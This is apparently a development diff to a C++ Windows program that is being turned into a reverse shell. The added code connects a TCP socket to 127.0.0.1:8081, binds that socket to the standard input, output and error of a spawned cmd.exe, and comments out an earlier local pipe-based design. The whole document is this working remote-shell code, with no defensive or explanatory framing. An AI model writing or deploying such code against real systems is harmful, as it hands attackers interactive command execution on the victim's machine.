@@ -1,6 +1,7 @@
 #include <winsock2.h>
 #include <iostream>
 #include <ws2tcpip.h>
+#include <Windows.h>
 
 HANDLE hChildStdOutRead, hChildStdOutWrite;                             //stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                               //stdin
@@ -43,19 +44,46 @@ void give_command(const std::string& command)
 
 int main()
 {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
+    {
+        std::cerr << "WSAStartup failed.\n";
+        return 1;
+    }
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+      
+    //SOCKET clientSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) 
+    {
+        std::cerr << "socket failed.\n";
+        WSACleanup();
+        return 1;
+    }    
+
+    // sockaddr_in serverAddr;
+    // serverAddr.sin_family = AF_INET;
+    // serverAddr.sin_port = htons(8080);
+    // serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8080);
+    serverAddr.sin_port = htons(8081); // Port for input socket
     serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
 
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    
-    WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-    SOCKET clientSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     //connect(clientSock, (sockaddr*)&serverAddr, sizeof(serverAddr));
+    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    {
+        std::cerr << "connect failed.\n";
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
 
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -68,26 +96,21 @@ int main()
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
 
-    // Create pipes for child process's STDOUT.
-    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);
-    SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);
-    // Create pipes for child process's STDIN.
-    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
-    SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0); 
-
-
+    PROCESS_INFORMATION pi = {0};
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = hChildStdOutWrite;
-    si.hStdError = hChildStdOutWrite;
-    si.hStdInput = hChildStdInRead;
+    si.hStdOutput = si.hStdError = si.hStdInput = (HANDLE)sock;
 
     
-    PROCESS_INFORMATION pi = {0};
     wchar_t command[] = L"cmd.exe";
-    CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-
+    if(!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
+        std::cerr << "CreateProcess failed.\n";
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
 
     // Close handles not needed by the parent.
     CloseHandle(hChildStdOutWrite);
@@ -97,7 +120,7 @@ int main()
 
 
 
-    give_command("dir");
+    //give_command("dir");
     //give_command(receive_data(clientSock));
 
     //send_data(clientSock, const string &data)       
@@ -112,37 +135,37 @@ int main()
     // }
 
 // Start reading from the pipe with a timeout
-    char buffer[4096];
-    DWORD bytesRead = 0;
-    DWORD timeout = 5000;  // 5 seconds timeout
-    DWORD startTime = GetTickCount();
+    // char buffer[4096];
+    // DWORD bytesRead = 0;
+    // DWORD timeout = 5000;  // 5 seconds timeout
+    // DWORD startTime = GetTickCount();
 
-    while (TRUE)
-    {
-        // Check the time elapsed
-        DWORD elapsedTime = GetTickCount() - startTime;
-        if (elapsedTime >= timeout)
-        {
-            // Timeout reached
-            cout << "Timed out while reading output." << endl;
-            break;
-        }
+    // while (TRUE)
+    // {
+    //     // Check the time elapsed
+    //     DWORD elapsedTime = GetTickCount() - startTime;
+    //     if (elapsedTime >= timeout)
+    //     {
+    //         // Timeout reached
+    //         cout << "Timed out while reading output." << endl;
+    //         break;
+    //     }
 
-        // Try to read from the pipe
-        if (ReadFile(hChildStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
-        {
-            buffer[bytesRead] = '\0';  // Null-terminate the buffer
-            cout << "Received Output: " << buffer << endl;
-            break;  // Successfully read, break out of the loop
-        }
-        else
-        {
-            // Sleep for a while to avoid busy-waiting
-            Sleep(100);  // Sleep 10 milliseconds
-        }
-    }
+    //     // Try to read from the pipe
+    //     if (ReadFile(hChildStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
+    //     {
+    //         buffer[bytesRead] = '\0';  // Null-terminate the buffer
+    //         cout << "Received Output: " << buffer << endl;
+    //         break;  // Successfully read, break out of the loop
+    //     }
+    //     else
+    //     {
+    //         // Sleep for a while to avoid busy-waiting
+    //         Sleep(100);  // Sleep 10 milliseconds
+    //     }
+    // }
 
-    cout<< "here";
+    // cout<< "here";
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -156,7 +179,7 @@ int main()
  
     //send_data(clientSock," closing!! ");
 
-    closesocket(clientSock);
+    //closesocket(clientSock);
     WSACleanup();
     
     return 0;
